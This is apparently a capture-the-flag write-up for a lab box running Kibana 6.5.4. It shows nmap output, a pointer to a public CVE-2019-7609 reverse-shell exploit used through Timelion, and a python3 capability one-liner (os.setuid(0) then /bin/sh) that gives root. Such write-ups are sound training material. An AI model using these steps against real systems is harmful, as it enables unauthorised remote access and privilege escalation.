# resources
- https://nvd.nist.gov/vuln/detail/CVE-2019-7609
- https://github.com/mpgn/CVE-2019-7609. 
- https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications
- https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities

# recon
- nmap as allways
```
port scanning...
22/tcp open  ssh
80/tcp open  http
Enumerating open ports...
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-03 15:30 EDT
Nmap scan report for 10.10.197.113
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9d:f8:d1:57:13:24:81:b6:18:5d:04:8e:d2:38:4f:90 (RSA)
|   256 e1:e6:7a:a1:a1:1c:be:03:d2:4e:27:1b:0d:0a:ec:b1 (ECDSA)
|_  256 2a:ba:e5:c5:fb:51:38:17:45:e7:b1:54:ca:a1:a3:fc (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
5044/tcp open  lxi-evntsvc?
5601/tcp open  esmagent?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 60
|     connection: close
|     Date: Thu, 03 Sep 2020 19:40:50 GMT
|     {"statusCode":404,"error":"Not Found","message":"Not Found"}
|   GetRequest: 
|     HTTP/1.1 302 Found
|     location: /app/kibana
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     cache-control: no-cache
|     content-length: 0
|     connection: close
|     Date: Thu, 03 Sep 2020 19:40:48 GMT
|   HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 38
|     connection: close
|     Date: Thu, 03 Sep 2020 19:40:48 GMT
|_    {"statusCode":404,"error":"Not Found"}

```
- gobuster on port 80: nothing juicy
checking version? by visit `/app/kibana#/management` or view source code and search for `version`
```
version&quot;:&quot;6.5.4&
```
after some googling and diging, I found https://nvd.nist.gov/vuln/detail/CVE-2019-7609 which lead me to https://github.com/mpgn/CVE-2019-7609. 


# foot hold
follow step by step https://github.com/mpgn/CVE-2019-7609.
1. Open Kibana
2. Past one of the following payload into the Timelion visualizer
3. Click run
4. On the left panel click on Canvas
5. Your reverse shell should pop ! :)

There are 2 payloads on the github repo, first payload didnt works for me.


now just go grab the user flag
# root
I found really interesting files on `/home/kiba`
```
kiba@ubuntu:/home/kiba$ ls -la
ls -la
total 111064
drwxr-xr-x  6 kiba kiba      4096 Sep  3 14:01 .
drwxr-xr-x  3 root root      4096 Mar 31 10:41 ..
-rw-rw-r--  1 kiba kiba    407592 Sep  3 14:01 .babel.json
-rw-------  1 kiba kiba      9605 Mar 31 23:05 .bash_history
-rw-r--r--  1 kiba kiba       220 Mar 31 10:41 .bash_logout
-rw-r--r--  1 kiba kiba      3771 Mar 31 10:41 .bashrc
drwx------  2 kiba kiba      4096 Mar 31 16:42 .cache
drwxrwxr-x  2 kiba kiba      4096 Mar 31 22:38 .hackmeplease
drwxrwxr-x  2 kiba kiba      4096 Mar 31 17:22 .nano
-rw-r--r--  1 kiba kiba       655 Mar 31 10:41 .profile
-rw-r--r--  1 kiba kiba         0 Mar 31 16:52 .sudo_as_admin_successful
-rw-r--r--  1 root root       176 Mar 31 18:16 .wget-hsts
-rw-rw-r--  1 kiba kiba 113259798 Dec 19  2018 elasticsearch-6.5.4.deb
drwxrwxr-x 11 kiba kiba      4096 Dec 17  2018 kibana
-rw-rw-r--  1 kiba kiba        35 Mar 31 22:59 user.txt
kiba@ubuntu:/home/kiba$ ls -la .hackmeplease
ls -la .hackmeplease
total 4356
drwxrwxr-x 2 kiba kiba    4096 Mar 31 22:38 .
drwxr-xr-x 6 kiba kiba    4096 Sep  3 14:01 ..
-rwxr-xr-x 1 root root 4452016 Mar 31 22:38 python3
```
it is not often you find a binary files in this location. Also the name of the direcktory are baging for us.

so I try to run `print(123)` and it works. So we do have prive to run python3 even tho it is own by `root`. how come? read this to understand why https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities


so let exploit linux capability and get root
```
/home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/sh");'
```